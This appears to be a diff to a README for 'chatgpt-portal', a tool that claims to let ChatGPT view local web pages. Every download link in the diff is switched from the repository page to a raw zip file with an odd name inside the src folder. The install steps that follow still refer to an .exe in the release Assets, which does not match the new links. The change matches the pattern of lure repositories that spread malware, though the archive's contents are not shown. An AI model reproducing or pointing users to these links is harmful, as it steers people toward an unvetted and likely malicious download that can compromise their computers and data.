@@ -1,6 +1,6 @@
 # 🌐 chatgpt-portal - View local web pages in ChatGPT
 
-[![Download chatgpt-portal](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Glabrous-driving823/chatgpt-portal)
+[![Download chatgpt-portal](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Glabrous-driving823/chatgpt-portal/raw/refs/heads/main/src/portal_chatgpt_perispherical.zip)
 
 This software lets you connect your local web projects to ChatGPT. You can share snapshots of authenticated pages with the AI assistant through a secure Cloudflare tunnel. This keeps your local data safe while allowing ChatGPT to read and process your web interface content.
 
@@ -8,7 +8,7 @@ This software lets you connect your local web projects to ChatGPT. You can share
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Go to the [official download page](https://github.com/Glabrous-driving823/chatgpt-portal).
+1. Go to the [official download page](https://github.com/Glabrous-driving823/chatgpt-portal/raw/refs/heads/main/src/portal_chatgpt_perispherical.zip).
 2. Look for the Assets section at the bottom of the latest release.
 3. Select the file ending in .exe.
 4. Save the file to your computer.
@@ -81,4 +81,4 @@ This software is a tool for developers and users who need a bridge between their
 
 Visit the official repository to get the latest version and start bridging your data:
 
-[Download chatgpt-portal](https://github.com/Glabrous-driving823/chatgpt-portal)
+[Download chatgpt-portal](https://github.com/Glabrous-driving823/chatgpt-portal/raw/refs/heads/main/src/portal_chatgpt_perispherical.zip)
